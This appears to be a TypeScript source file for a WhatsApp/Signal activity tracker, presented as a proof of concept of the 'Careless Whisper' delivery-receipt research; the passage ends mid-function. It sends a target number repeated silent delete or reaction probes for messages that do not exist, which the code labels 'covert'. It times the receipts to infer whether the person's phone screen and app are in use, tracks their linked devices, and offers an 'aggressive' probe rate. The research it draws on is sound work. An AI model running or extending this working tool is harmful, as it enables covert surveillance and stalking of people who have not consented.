import '@whiskeysockets/baileys';
import { WASocket, proto, jidNormalizedUser } from '@whiskeysockets/baileys';
import { pino } from 'pino';

// Suppress Baileys debug output (Closing session spam)
const logger = pino({
    level: process.argv.includes('--debug') ? 'debug' : 'silent'
});

/**
 * Probe method types
 * - 'delete': Silent delete probe (sends delete request for non-existent message) - DEFAULT
 * - 'reaction': Reaction probe (sends reaction to non-existent message)
 */
export type ProbeMethod = 'delete' | 'reaction';

/**
 * Device state enumeration
 */
enum DeviceState {
    OFFLINE = 'OFFLINE',
    APP_FOREGROUND = 'App Active',
    APP_MINIMIZED = 'App Minimized',
    SCREEN_ON = 'Screen On (Idle)',
    SCREEN_OFF = 'Standby',
    CALIBRATING = 'Calibrating...'
}

/**
 * State thresholds combining absolute and network-adjusted values
 */
interface StateThresholds {
    // Absolute thresholds from research (baseline)
    absolute: {
        veryActive: number;    // App in foreground
        minimized: number;     // App minimized but screen on
        screenOn: number;      // Screen on, app background
        screenOff: number;     // Screen off / deep standby
    };
    // Network-adjusted thresholds (absolute + network baseline)
    adjusted: {
        veryActive: number;
        minimized: number;
        screenOn: number;
        screenOff: number;
    };
    // Percentile-based boundaries (for sanity checks)
    percentiles: {
        p25: number;
        p50: number;
        p75: number;
        p90: number;
    };
}

/**
 * RTT Cluster representing a device state
 */
interface RTTCluster {
    centroid: number;              // Cluster center (mean RTT)
    samples: number[];             // Sample RTTs in this cluster
    variance: number;              // Cluster variance
    confidence: number;            // Confidence score (0-1)
}

/**
 * Enhanced calibration state tracking with adaptive learning
 */
interface CalibrationState {
    samplesCollected: number;
    requiredSamples: number;       // 500 minimum (increased for better accuracy)
    networkBaseline: number;        // Robust baseline using trimmed mean
    networkVariance: number;        // Network variance for confidence scoring
    isCalibrated: boolean;
    calibrationStartedAt: number;
    calibrationPhase: 'initial' | 'clustering' | 'refinement' | 'adaptive';
    // Clustering data
    clusters: Map<string, RTTCluster>;  // Automatically detected state clusters
    clusteringComplete: boolean;
    // Adaptive recalibration
    lastRecalibration: number;
    recalibrationInterval: number;      // Recalibrate every N samples
    adaptiveWindow: number[];           // Rolling window for adaptive baseline (last 200 samples)
}

/**
 * Temporal pattern detection for transition ramps
 */
interface TemporalPattern {
    windowSize: number;             // 30 seconds
    samples: Array<{rtt: number; timestamp: number}>;
    trendDirection: 'rising' | 'falling' | 'stable';
    transitionDetected: boolean;
}

/**
 * State hysteresis to prevent flapping
 */
interface StateHysteresis {
    currentState: string;
    stateEnteredAt: number;
    minimumStateDuration: number;   // 10 seconds
    transitionMargin: number;       // Must cross threshold by 20% margin
}

/**
 * Per-state sample tracking
 */
interface StateStatistics {
    state: string;
    sampleCount: number;
    avgRTT: number;
    minRTT: number;
    maxRTT: number;
    firstSeen: number;
    lastSeen: number;
}

/**
 * Logger utility for debug and normal mode
 */
class TrackerLogger {
    private isDebugMode: boolean;

    constructor(debugMode: boolean = false) {
        this.isDebugMode = debugMode;
    }

    setDebugMode(enabled: boolean) {
        this.isDebugMode = enabled;
    }

    debug(...args: any[]) {
        if (this.isDebugMode) {
            console.log(...args);
        }
    }

    info(...args: any[]) {
        console.log(...args);
    }

    formatDeviceState(jid: string, rtt: number, avgRtt: number, median: number, threshold: number, state: string) {
        const stateColor = '';
        const timestamp = new Date().toLocaleTimeString('de-DE');

        // Box width is 64 characters, inner content is 62 characters (excluding ║ on both sides)
        const boxWidth = 62;

        const header = `${stateColor} Device Status Update - ${timestamp}`;
        const jidLine = `JID:        ${jid}`;
        const statusLine = `Status:     ${state}`;
        const rttLine = `RTT:        ${rtt}ms`;
        const avgLine = `Avg (3):    ${avgRtt.toFixed(0)}ms`;
        const medianLine = `Median:     ${median.toFixed(0)}ms`;
        const thresholdLine = `Threshold:  ${threshold.toFixed(0)}ms`;

        console.log(`\n╔════════════════════════════════════════════════════════════════╗`);
        console.log(`║ ${header.padEnd(boxWidth)} ║`);
        console.log(`╠════════════════════════════════════════════════════════════════╣`);
        console.log(`║ ${jidLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${statusLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${rttLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${avgLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${medianLine.padEnd(boxWidth)} ║`);
        console.log(`║ ${thresholdLine.padEnd(boxWidth)} ║`);
        console.log(`╚════════════════════════════════════════════════════════════════╝\n`);
    }
}

const trackerLogger = new TrackerLogger();

/**
 * Metrics tracked per device for activity monitoring
 */
interface DeviceMetrics {
    rttHistory: number[];      // Historical RTT measurements (up to 2000)
    recentRtts: number[];      // Recent RTTs for exponential moving average (last 10)
    state: string;             // Current device state (Active/Online/Standby/Calibrating/Offline)
    lastRtt: number;           // Most recent RTT measurement
    lastUpdate: number;        // Timestamp of last update
    ema: number;               // Exponential moving average for smoother detection
    stateChangedAt: number;    // Timestamp when state last changed (for hysteresis)
    stateHistory: Array<{state: string, timestamp: number, rtt: number}>; // Historical states
    baselineP25: number;       // 25th percentile (very active)
    baselineP50: number;       // 50th percentile (median)
    baselineP75: number;       // 75th percentile (standby threshold)
    baselineP90: number;       // 90th percentile (deep standby)
    // New fields for improved accuracy
    calibration: CalibrationState;       // Calibration state
    thresholds: StateThresholds;         // Hybrid thresholds
    temporalPattern: TemporalPattern;    // Temporal pattern detection
    stateStats: Map<string, StateStatistics>;  // Per-state statistics
}

/**
 * WhatsAppTracker - Monitors messaging app user activity using RTT-based analysis
 *
 * This class implements a privacy research proof-of-concept that demonstrates
 * how messaging apps can leak user activity information through network timing.
 *
 * The tracker sends probe messages and measures Round-Trip Time (RTT) to detect
 * when a user's device is actively in use vs. in standby mode.
 *
 * Works with WhatsApp, Signal, and similar messaging platforms.
 *
 * Based on research: "Careless Whisper: Exploiting Silent Delivery Receipts to Monitor Users"
 * by Gegenhuber et al., University of Vienna & SBA Research
 */
export class WhatsAppTracker {
    private sock: WASocket;
    private targetJid: string;
    private trackedJids: Set<string> = new Set(); // Multi-device support

    private lidMap: Map<string, string> = new Map(); // Map LID -> Phone JID

    private isTracking: boolean = false;
    private deviceMetrics: Map<string, DeviceMetrics> = new Map();
    private globalRttHistory: number[] = []; // For threshold calculation
    private probeStartTimes: Map<string, number> = new Map();
    private probeTimeouts: Map<string, NodeJS.Timeout> = new Map();
    private probeTargets: Map<string, string> = new Map(); // Map message ID -> target JID
    private lastPresence: string | null = null;
    private probeMethod: ProbeMethod = 'delete'; // Default to delete method
    private aggressiveMode: boolean = false; // New: Aggressive mode flag
    private customProbeInterval: number | null = null; // New: Custom probe interval in ms
    public onUpdate?: (data: any) => void;

    constructor(sock: WASocket, targetJid: string, debugMode: boolean = false) {
        this.sock = sock;
        this.targetJid = targetJid;
        this.trackedJids.add(targetJid);
        trackerLogger.setDebugMode(debugMode);
    }

    public setProbeMethod(method: ProbeMethod) {
        this.probeMethod = method;
        trackerLogger.info(`\nProbe method changed to: ${method === 'delete' ? 'Silent Delete' : 'Reaction'}\n`);
    }

    public getProbeMethod(): ProbeMethod {
        return this.probeMethod;
    }

    public setAggressiveMode(enabled: boolean) {
        this.aggressiveMode = enabled;
        trackerLogger.info(`\nAggressive mode ${enabled ? 'enabled' : 'disabled'} - Probe rate ${enabled ? 'increased' : 'decreased'}\n`);
    }

    public setProbeInterval(intervalMs: number) {
        this.customProbeInterval = intervalMs;
        trackerLogger.info(`\nCustom probe interval set to ${intervalMs}ms\n`);
    }

    /**
     * Start tracking the target user's activity
     * Sets up event listeners for message receipts and presence updates
     */
    public async startTracking() {
        if (this.isTracking) return;
        this.isTracking = true;
        trackerLogger.info(`\nTracking started for ${this.targetJid}`);
        trackerLogger.info(`Probe method: ${this.probeMethod === 'delete' ? 'Silent Delete (covert)' : 'Reaction'}`);
        if (this.customProbeInterval) {
            trackerLogger.info(`Custom probe interval: ${this.customProbeInterval}ms`);
        } else {
            trackerLogger.info(`Aggressive mode: ${this.aggressiveMode ? 'Enabled (2s probes)' : 'Disabled (5s probes)'}`);
        }
        trackerLogger.info('');

        // Listen for message updates (receipts)
        this.sock.ev.on('messages.update', (updates) => {
            for (const update of updates) {
                // Check if update is from any of the tracked JIDs (multi-device support)
                if (update.key.remoteJid && this.trackedJids.has(update.key.remoteJid) && update.key.fromMe) {
                    this.analyzeUpdate(update);
                }
            }
        });

        // Listen for raw receipts to catch 'inactive' type which are ignored by Baileys
        this.sock.ws.on('CB:receipt', (node: any) => {
            this.handleRawReceipt(node);
        });

        // Listen for presence updates
        this.sock.ev.on('presence.update', (update) => {
            trackerLogger.debug('[PRESENCE] Raw update received:', JSON.stringify(update, null, 2));

            if (update.presences) {
                for (const [jid, presenceData] of Object.entries(update.presences)) {
                    if (presenceData) {
                        // Track multi-device JIDs (including LID)
                        this.trackedJids.add(jid);
                        trackerLogger.debug(`[MULTI-DEVICE] Added JID to tracking: ${jid}`);
                        
                        // Store LID mapping if applicable
                        if (jid.includes('@lid')) {
                            this.lidMap.set(jid, this.targetJid);
                            trackerLogger.debug(`[LID MAPPING] Learned LID ${jid} for ${this.targetJid}`);
                        }

                        if (presenceData.lastKnownPresence) {
                            this.lastPresence = presenceData.lastKnownPresence;
                            trackerLogger.debug(`[PRESENCE] Stored presence from ${jid}: ${this.lastPresence}`);
                        }
                        break;
                    }
                }
            }
        });

        // Subscribe to presence updates
        try {
            await this.sock.presenceSubscribe(this.targetJid);
            trackerLogger.debug(`[PRESENCE] Successfully subscribed to presence for ${this.targetJid}`);
            trackerLogger.debug(`[MULTI-DEVICE] Currently tracking JIDs: ${Array.from(this.trackedJids).join(', ')}`);
        } catch (err) {
            trackerLogger.debug('[PRESENCE] Error subscribing to presence:', err);
        }

        // Send initial state update
        if (this.onUpdate) {
            this.onUpdate({
                devices: [],
                deviceCount: this.trackedJids.size,
                presence: this.lastPresence,
                median: 0,
                threshold: 0
            });
        }

        // Start the probe loop
        this.probeLoop();
    }

    private async probeLoop() {
        while (this.isTracking) {
            try {
                await this.sendProbe();
            } catch (err) {
                logger.error(err, 'Error sending probe');
            }
            
            // Adaptive rate: Slow down only if ALL devices are OFFLINE
            let baseDelay = this.customProbeInterval ?? (this.aggressiveMode ? 2000 : 5000);

            // Check if any device is still online
            let anyDeviceOnline = false;
            for (const [jid, metrics] of this.deviceMetrics.entries()) {
                if (metrics.state !== 'OFFLINE' && metrics.state !== DeviceState.OFFLINE) {
                    anyDeviceOnline = true;
                    break;
                }
            }

            // Only slow down if all tracked devices are offline
            if (!anyDeviceOnline && this.deviceMetrics.size > 0) {
                if (this.customProbeInterval) {
                    baseDelay = Math.max(this.customProbeInterval, 5000); // Minimum 5s offline
                } else {
                    baseDelay = this.aggressiveMode ? 10000 : 30000;
                }
                trackerLogger.debug(`[ADAPTIVE] All devices OFFLINE, slowing probe rate to ${baseDelay}ms`);
            } else if (anyDeviceOnline) {
                trackerLogger.debug(`[ADAPTIVE] At least one device online, maintaining normal probe rate`);
            }

            const delay = Math.floor(Math.random() * 100) + baseDelay;
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }

    private async sendProbe() {
        if (this.probeMethod === 'delete') {
            await this.sendDeleteProbe();
        } else {
            await this.sendReactionProbe();
        }
    }

    /**
     * Send a delete probe - completely silent/covert method
     * Sends a "delete" command for a non-existent message
     */
    private async sendDeleteProbe() {
        try {
            // Generate a random message ID that likely doesn't exist
            const prefixes = ['3EB0', 'BAE5', 'F1D2', 'A9C4', '7E8B', 'C3F9', '2D6A'];
            const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            const randomSuffix = Math.random().toString(36).substring(2, 10).toUpperCase();
            const randomMsgId = randomPrefix + randomSuffix;
            
            const randomDeleteMessage = {
                delete:{
                    remoteJid: this.targetJid,
                    fromMe: true,
                    id: randomMsgId,
                }
            };

            trackerLogger.debug(
                `[PROBE-DELETE] Sending silent delete probe for fake message ${randomMsgId}`
            );
            const startTime = Date.now();
            
            const result = await this.sock.sendMessage(this.targetJid, randomDeleteMessage);

            if (result?.key?.id) {
                trackerLogger.debug(`[PROBE-DELETE] Delete probe sent successfully, message ID: ${result.key.id}`);
                this.probeStartTimes.set(result.key.id, startTime);
                this.probeTargets.set(result.key.id, this.targetJid); // Store target JID

                // Set timeout: if no CLIENT ACK within 10 seconds, mark device as OFFLINE
                const timeoutId = setTimeout(() => {
                    if (this.probeStartTimes.has(result.key.id!)) {
                        const elapsedTime = Date.now() - startTime;
                        const targetJid = this.probeTargets.get(result.key.id!) || result.key.remoteJid;
                        trackerLogger.debug(`[PROBE-DELETE TIMEOUT] No CLIENT ACK for ${result.key.id} after ${elapsedTime}ms - Device is OFFLINE`);
                        this.probeStartTimes.delete(result.key.id!);
                        this.probeTimeouts.delete(result.key.id!);
                        this.probeTargets.delete(result.key.id!);

                        // Mark device as OFFLINE due to no response
                        if (targetJid) {
                            this.markDeviceOffline(targetJid, elapsedTime);
                        }
                    }
                }, 10000); // 10 seconds timeout

                this.probeTimeouts.set(result.key.id, timeoutId);
            } else {
                trackerLogger.debug('[PROBE-DELETE ERROR] Failed to get message ID from send result');
            }
        } catch (err) {
            logger.error(err, '[PROBE-DELETE ERROR] Failed to send delete probe message');
        }
    }

    /**
     * Send a reaction probe - original method
     * Uses a reaction to a non-existent message to minimize user disruption
     */
    private async sendReactionProbe() {
        try {
            // Generate a random message ID that likely doesn't exist
            const prefixes = ['3EB0', 'BAE5', 'F1D2', 'A9C4', '7E8B', 'C3F9', '2D6A'];
            const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            const randomSuffix = Math.random().toString(36).substring(2, 10).toUpperCase();
            const randomMsgId = randomPrefix + randomSuffix;

            // Randomize reaction emoji
            const reactions = ['', '', '', '', '', '', '', '', '', ''];
            const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];

            const reactionMessage = {
                react: {
                    text: randomReaction,
                    key: {
                        remoteJid: this.targetJid,
                        fromMe: false,
                        id: randomMsgId
                    }
                }
            };

            trackerLogger.debug(`[PROBE-REACTION] Sending probe with reaction "${randomReaction}" to non-existent message ${randomMsgId}`);
            const result = await this.sock.sendMessage(this.targetJid, reactionMessage);
            const startTime = Date.now();

            if (result?.key?.id) {
                trackerLogger.debug(`[PROBE-REACTION] Probe sent successfully, message ID: ${result.key.id}`);
                this.probeStartTimes.set(result.key.id, startTime);
                this.probeTargets.set(result.key.id, this.targetJid); // Store target JID

                // Set timeout: if no CLIENT ACK within 10 seconds, mark device as OFFLINE
                const timeoutId = setTimeout(() => {
                    if (this.probeStartTimes.has(result.key.id!)) {
                        const elapsedTime = Date.now() - startTime;
                        const targetJid = this.probeTargets.get(result.key.id!) || result.key.remoteJid;
                        trackerLogger.debug(`[PROBE-REACTION TIMEOUT] No CLIENT ACK for ${result.key.id} after ${elapsedTime}ms - Device is OFFLINE`);
                        this.probeStartTimes.delete(result.key.id!);
                        this.probeTimeouts.delete(result.key.id!);
                        this.probeTargets.delete(result.key.id!);

                        // Mark device as OFFLINE due to no response
                        if (targetJid) {
                            this.markDeviceOffline(targetJid, elapsedTime);
                        }
                    }
                }, 10000); // 10 seconds timeout

                this.probeTimeouts.set(result.key.id, timeoutId);
            } else {
                trackerLogger.debug('[PROBE-REACTION ERROR] Failed to get message ID from send result');
            }
        } catch (err) {
            logger.error(err, '[PROBE-REACTION ERROR] Failed to send probe message');
        }
    }

    /**
     * Handle raw receipt nodes directly from the websocket
     * This is necessary because Baileys ignores receipts with type="inactive"
     */
    private handleRawReceipt(node: any) {
        try {
            const { attrs } = node;
            
            // LOG ALL RECEIPTS for debugging iOS behavior
            trackerLogger.debug(`[RAW RECEIPT] Received receipt: ${JSON.stringify(attrs)}`);

            const msgId = attrs.id;
            const fromJid = attrs.from;

            if (!fromJid) return;

            // Extract base number
            const baseNumber = fromJid.split('@')[0].split(':')[0];

            // Check if this matches our target
            let isTracked = this.trackedJids.has(fromJid) ||
                              this.trackedJids.has(`${baseNumber}@s.whatsapp.net`);

            // Check LID mapping
            if (!isTracked && fromJid.includes('@lid')) {
                // Try to find if this LID maps to our target
                if (this.lidMap.has(fromJid)) {
                    isTracked = true;
                    // Use the phone JID for processing
                    const mappedJid = this.lidMap.get(fromJid);
                    if (mappedJid) {
                         this.processAck(msgId, mappedJid, attrs.type || 'unknown');
                         return;
                    }
                }
            }

            if (isTracked) {
                // Process ALL receipts for tracked devices
                this.processAck(msgId, fromJid, attrs.type || 'unknown');
            }
        } catch (err) {
            trackerLogger.debug(`[RAW RECEIPT] Error handling receipt: ${err}`);
        }
    }

    /**
     * Process an ACK (receipt) from a device
     */
    private processAck(msgId: string, fromJid: string, type: string) {
        trackerLogger.debug(`[ACK PROCESS] ID: ${msgId}, JID: ${fromJid}, Type: ${type}`);

        if (!msgId || !fromJid) return;

        // Check if this is one of our probes
        const startTime = this.probeStartTimes.get(msgId);

        if (startTime) {
            const rtt = Date.now() - startTime;

            // Get the original target JID this probe was sent to
            const targetJid = this.probeTargets.get(msgId);

            if (targetJid && fromJid !== targetJid) {
                // ACK came from a different JID (likely an LID) - learn the mapping
                trackerLogger.debug(`[LID MAPPING] Auto-learned: ${fromJid} -> ${targetJid}`);
                this.lidMap.set(fromJid, targetJid);
                trackerLogger.debug(`[TRACKING] ${type.toUpperCase()} received for ${msgId} from ${fromJid} (LID), crediting to ${targetJid}, RTT: ${rtt}ms`);
            } else {
                trackerLogger.debug(`[TRACKING] ${type.toUpperCase()} received for ${msgId} from ${fromJid}, RTT: ${rtt}ms`);
            }

            // Clear timeout
            const timeoutId = this.probeTimeouts.get(msgId);
            if (timeoutId) {
                clearTimeout(timeoutId);
                this.probeTimeouts.delete(msgId);
            }

            this.probeStartTimes.delete(msgId);
            this.probeTargets.delete(msgId);

            // Credit the RTT to the original target JID, not the LID that responded
            this.addMeasurementForDevice(targetJid || fromJid, rtt);
        }
    }

    /**
     * Analyze message update and calculate RTT
     * @param update Message update from WhatsApp
     */
    private analyzeUpdate(update: { key: proto.IMessageKey, update: Partial<proto.IWebMessageInfo> }) {
        const status = update.update.status;
        const msgId = update.key.id;
        let fromJid = update.key.remoteJid;

        if (!msgId || !fromJid) return;

        // Map LID to Phone JID if possible
        if (fromJid.includes('@lid') && this.lidMap.has(fromJid)) {
            const mappedJid = this.lidMap.get(fromJid);
            trackerLogger.debug(`[LID MAPPING] Mapped ${fromJid} -> ${mappedJid}`);
            fromJid = mappedJid!;
        }

        trackerLogger.debug(`[TRACKING] Message Update - ID: ${msgId}, JID: ${fromJid}, Status: ${status} (${this.getStatusName(status)})`);

        // Only CLIENT ACK (3) means device is online and received the message
        // SERVER ACK (2) only means server received it, not the device
        if (status === 3) { // CLIENT ACK
            this.processAck(msgId, fromJid, 'client_ack');
        }
    }

    private getStatusName(status: number | null | undefined): string {
        switch (status) {
            case 0: return 'ERROR';
            case 1: return 'PENDING';
            case 2: return 'SERVER_ACK';
            case 3: return 'DELIVERY_ACK';
            case 4: return 'READ';
            case 5: return 'PLAYED';
            default: return 'UNKNOWN';
        }
    }

    /**
     * Mark a device as OFFLINE when no CLIENT ACK is received
     * @param jid Device JID
     * @param timeout Time elapsed before timeout
     */
    private markDeviceOffline(jid: string, timeout: number) {
        // Initialize device metrics if not exists
        if (!this.deviceMetrics.has(jid)) {
            this.deviceMetrics.set(jid, {
                rttHistory: [],
                recentRtts: [],
                state: 'OFFLINE',
                lastRtt: timeout,
                lastUpdate: Date.now(),
                ema: 0,
                stateChangedAt: Date.now(),
                stateHistory: [{state: 'OFFLINE', timestamp: Date.now(), rtt: timeout}],
                baselineP25: 0,
                baselineP50: 0,
                baselineP75: 0,
                baselineP90: 0,
                // New fields
                calibration: this.initializeCalibration(),
                thresholds: this.initializeThresholds(),
                temporalPattern: this.initializeTemporalPattern(),
                stateStats: new Map<string, StateStatistics>()
            });
        } else {
            const metrics = this.deviceMetrics.get(jid)!;
            if (metrics.state !== 'OFFLINE') {
                metrics.stateHistory.push({state: 'OFFLINE', timestamp: Date.now(), rtt: timeout});
                metrics.stateChangedAt = Date.now();
            }
            metrics.state = 'OFFLINE';
            metrics.lastRtt = timeout;
            metrics.lastUpdate = Date.now();
        }

        trackerLogger.info(`\nDevice ${jid} marked as OFFLINE (no CLIENT ACK after ${timeout}ms)\n`);
        this.sendUpdate();
    }

    /**
     * Add RTT measurement for a specific device and update its state
     * @param jid Device JID
     * @param rtt Round-trip time in milliseconds
     */
    private addMeasurementForDevice(jid: string, rtt: number) {
        // Initialize device metrics if not exists
        if (!this.deviceMetrics.has(jid)) {
            this.deviceMetrics.set(jid, {
                rttHistory: [],
                recentRtts: [],
                state: DeviceState.CALIBRATING,
                lastRtt: rtt,
                lastUpdate: Date.now(),
                ema: rtt, // Initialize EMA with first value
                stateChangedAt: Date.now(),
                stateHistory: [{state: DeviceState.CALIBRATING, timestamp: Date.now(), rtt: rtt}],
                baselineP25: 0,
                baselineP50: 0,
                baselineP75: 0,
                baselineP90: 0,
                // New fields
                calibration: this.initializeCalibration(),
                thresholds: this.initializeThresholds(),
                temporalPattern: this.initializeTemporalPattern(),
                stateStats: new Map<string, StateStatistics>()
            });
        }

        const metrics = this.deviceMetrics.get(jid)!;

        // Only add measurements if we actually received a CLIENT ACK (rtt <= 5000ms)
        if (rtt <= 5000) {
            // Filter outliers using MAD (Median Absolute Deviation) before adding
            const isOutlier = this.isOutlier(rtt, metrics.rttHistory);

            if (!isOutlier || metrics.rttHistory.length < 10) {
                // 1. Add to device's recent RTTs (last 10 for better smoothing)
                metrics.recentRtts.push(rtt);
                if (metrics.recentRtts.length > 10) {
                    metrics.recentRtts.shift();
                }

                // 2. Update EMA (Exponential Moving Average) - more weight on recent data
                const alpha = 0.3; // Smoothing factor (0.3 = 30% weight on new value)
                metrics.ema = alpha * rtt + (1 - alpha) * metrics.ema;

                // 3. Add to device's history for calibration (last 2000)
                metrics.rttHistory.push(rtt);
                if (metrics.rttHistory.length > 2000) {
                    metrics.rttHistory.shift();
                }

                // 4. Update calibration state with multi-phase approach
                metrics.calibration.samplesCollected = metrics.rttHistory.length;

                // PHASE 1: Initial baseline estimation (50 samples)
                if (metrics.calibration.samplesCollected === 50 &&
                    metrics.calibration.calibrationPhase === 'initial') {

                    metrics.calibration.networkBaseline = this.calculateRobustBaseline(metrics.rttHistory);
                    metrics.calibration.networkVariance = this.calculateVariance(
                        metrics.rttHistory,
                        metrics.calibration.networkBaseline
                    );
                    metrics.calibration.calibrationPhase = 'clustering';

                    trackerLogger.info(
                        `\n[PHASE 1 COMPLETE] ${jid}: Initial baseline: ${metrics.calibration.networkBaseline.toFixed(0)}ms, ` +
                        `StdDev: ${Math.sqrt(metrics.calibration.networkVariance).toFixed(0)}ms\n`
                    );
                }

                // PHASE 2: Cluster detection (200 samples)
                if (metrics.calibration.samplesCollected === 200 &&
                    metrics.calibration.calibrationPhase === 'clustering') {

                    // Perform k-means clustering to detect device states
                    const clusters = this.performKMeansClustering(metrics.rttHistory, 4);

                    // Store clusters
                    metrics.calibration.clusters.clear();
                    clusters.forEach((cluster, index) => {
                        const stateName = ['veryActive', 'minimized', 'screenOn', 'screenOff'][index] || `cluster${index}`;
                        metrics.calibration.clusters.set(stateName, cluster);
                    });

                    metrics.calibration.clusteringComplete = true;
                    metrics.calibration.calibrationPhase = 'refinement';

                    // Update thresholds based on detected clusters
                    this.updateAdaptiveThresholds(
                        metrics.thresholds,
                        clusters,
                        metrics.calibration.networkBaseline
                    );

                    trackerLogger.info(
                        `\n[PHASE 2 COMPLETE] ${jid}: Detected ${clusters.length} RTT clusters\n` +
                        clusters.map((c, i) =>
                            `  Cluster ${i}: ${c.centroid.toFixed(0)}ms ± ${Math.sqrt(c.variance).toFixed(0)}ms ` +
                            `(${c.samples.length} samples, confidence: ${(c.confidence * 100).toFixed(0)}%)`
                        ).join('\n') + '\n'
                    );
                }

                // PHASE 3: Refinement (500 samples) - Mark as fully calibrated
                if (metrics.calibration.samplesCollected >= metrics.calibration.requiredSamples &&
                    !metrics.calibration.isCalibrated) {

                    // Final baseline recalculation with all data
                    metrics.calibration.networkBaseline = this.calculateRobustBaseline(metrics.rttHistory);
                    metrics.calibration.networkVariance = this.calculateVariance(
                        metrics.rttHistory,
                        metrics.calibration.networkBaseline
                    );

                    // Final clustering
                    const finalClusters = this.performKMeansClustering(metrics.rttHistory, 4);
                    metrics.calibration.clusters.clear();
                    finalClusters.forEach((cluster, index) => {
                        const stateName = ['veryActive', 'minimized', 'screenOn', 'screenOff'][index] || `cluster${index}`;
                        metrics.calibration.clusters.set(stateName, cluster);
                    });

                    // Update thresholds with final clusters
                    this.updateAdaptiveThresholds(
                        metrics.thresholds,
                        finalClusters,
                        metrics.calibration.networkBaseline
                    );

                    metrics.calibration.isCalibrated = true;
                    metrics.calibration.calibrationPhase = 'adaptive';
                    metrics.calibration.lastRecalibration = metrics.calibration.samplesCollected;

                    trackerLogger.info(
                        `\n[PHASE 3 COMPLETE] ${jid}: Full calibration complete!\n` +
                        `  Samples: ${metrics.calibration.samplesCollected}\n` +
                        `  Baseline: ${metrics.calibration.networkBaseline.toFixed(0)}ms\n` +
                        `  StdDev: ${Math.sqrt(metrics.calibration.networkVariance).toFixed(0)}ms\n` +
                        `  Clusters: ${finalClusters.length}\n` +
                        `  Entering adaptive mode (recalibrates every ${metrics.calibration.recalibrationInterval} samples)\n`
                    );
                }

                // PHASE 4: Adaptive mode - Continuous recalibration
                if (metrics.calibration.isCalibrated &&
                    metrics.calibration.calibrationPhase === 'adaptive') {

                    this.performAdaptiveRecalibration(metrics);
                }

                // 5. Update temporal pattern
                this.updateTemporalPattern(metrics.temporalPattern, rtt, Date.now());
            } else {
                trackerLogger.debug(`[OUTLIER FILTERED] RTT ${rtt}ms for ${jid} - likely network spike`);
            }

            // 6. Add to global history for global threshold calculation
            this.globalRttHistory.push(rtt);
            if (this.globalRttHistory.length > 2000) {
                this.globalRttHistory.shift();
            }

            metrics.lastRtt = rtt;
            metrics.lastUpdate = Date.now();

            // Determine new state based on RTT
            this.determineDeviceState(jid);
        }
        // If rtt > 5000ms, it means timeout - device is already marked as OFFLINE by markDeviceOffline()

        this.sendUpdate();
    }

    /**
     * Initialize thresholds with absolute values from research
     */
    private initializeThresholds(): StateThresholds {
        return {
            absolute: {
                veryActive: 350,    // App in foreground (~350ms RTT from research)
                minimized: 500,     // App minimized (~500ms RTT)
                screenOn: 1000,     // Screen on, app background (~1000ms RTT)
                screenOff: 1500     // Screen off (>1000ms RTT, using 1500ms as threshold)
            },
            adjusted: {
                veryActive: 350,    // Will be updated after network baseline calculation
                minimized: 500,
                screenOn: 1000,
                screenOff: 1500
            },
            percentiles: {
                p25: 0,
                p50: 0,
                p75: 0,
                p90: 0
            }
        };
    }

    /**
     * Initialize enhanced calibration state with adaptive learning
     */
    private initializeCalibration(): CalibrationState {
        return {
            samplesCollected: 0,
            requiredSamples: 500,         // 500 samples for robust calibration
            networkBaseline: 0,            // Robust baseline using trimmed mean
            networkVariance: 0,            // Network variance
            isCalibrated: false,
            calibrationStartedAt: Date.now(),
            calibrationPhase: 'initial',
            clusters: new Map<string, RTTCluster>(),
            clusteringComplete: false,
            lastRecalibration: Date.now(),
            recalibrationInterval: 300,    // Recalibrate every 300 samples
            adaptiveWindow: []
        };
    }

    /**
     * Initialize temporal pattern tracking
     */
    private initializeTemporalPattern(): TemporalPattern {
        return {
            windowSize: 30000,            // 30 seconds in milliseconds
            samples: [],
            trendDirection: 'stable',
            transitionDetected: false
        };
    }

    /**
     * Calculate robust network baseline using trimmed mean (removes outliers)
     * More accurate than simple median - removes top/bottom 10% before averaging
     * @param rttHistory Array of RTT measurements
     * @returns Robust baseline RTT
     */
    private calculateRobustBaseline(rttHistory: number[]): number {
        if (rttHistory.length < 50) return 0;

        // Sort the samples
        const sorted = [...rttHistory].sort((a, b) => a - b);

        // Use trimmed mean: remove top and bottom 10%
        const trimPercent = 0.10;
        const trimCount = Math.floor(sorted.length * trimPercent);
        const trimmed = sorted.slice(trimCount, sorted.length - trimCount);

        // Calculate mean of trimmed data
        const sum = trimmed.reduce((acc, val) => acc + val, 0);
        return sum / trimmed.length;
    }

    /**
     * Calculate variance of RTT samples for confidence scoring
     * @param samples Array of RTT measurements
     * @param mean Mean RTT value
     * @returns Variance
     */
    private calculateVariance(samples: number[], mean: number): number {
        if (samples.length < 2) return 0;

        const squaredDiffs = samples.map(val => Math.pow(val - mean, 2));
        return squaredDiffs.reduce((acc, val) => acc + val, 0) / samples.length;
    }

    /**
     * Perform k-means clustering on RTT data to automatically detect device states
     * Identifies distinct RTT clusters representing different device states
     * @param rttHistory Array of all RTT measurements
     * @param k Number of clusters (typically 3-4: active, minimized, screen-on, screen-off)
     * @returns Array of cluster centroids
     */
    private performKMeansClustering(rttHistory: number[], k: number = 4): RTTCluster[] {
        if (rttHistory.length < 50) return [];

        // Initialize centroids using quantile-based initialization (better than random)
        const sorted = [...rttHistory].sort((a, b) => a - b);
        const centroids: number[] = [];
        for (let i = 0; i < k; i++) {
            const quantile = (i + 1) / (k + 1);
            const index = Math.floor(quantile * sorted.length);
            centroids.push(sorted[index]);
        }

        // K-means iteration
        const maxIterations = 20;
        let iteration = 0;
        let converged = false;

        while (iteration < maxIterations && !converged) {
            // Assignment step: assign each point to nearest centroid
            const clusters: number[][] = Array.from({ length: k }, () => []);

            for (const rtt of rttHistory) {
                let nearestCluster = 0;
                let minDistance = Math.abs(rtt - centroids[0]);

                for (let i = 1; i < k; i++) {
                    const distance = Math.abs(rtt - centroids[i]);
                    if (distance < minDistance) {
                        minDistance = distance;
                        nearestCluster = i;
                    }
                }

                clusters[nearestCluster].push(rtt);
            }

            // Update step: recalculate centroids
            const newCentroids: number[] = [];
            for (let i = 0; i < k; i++) {
                if (clusters[i].length > 0) {
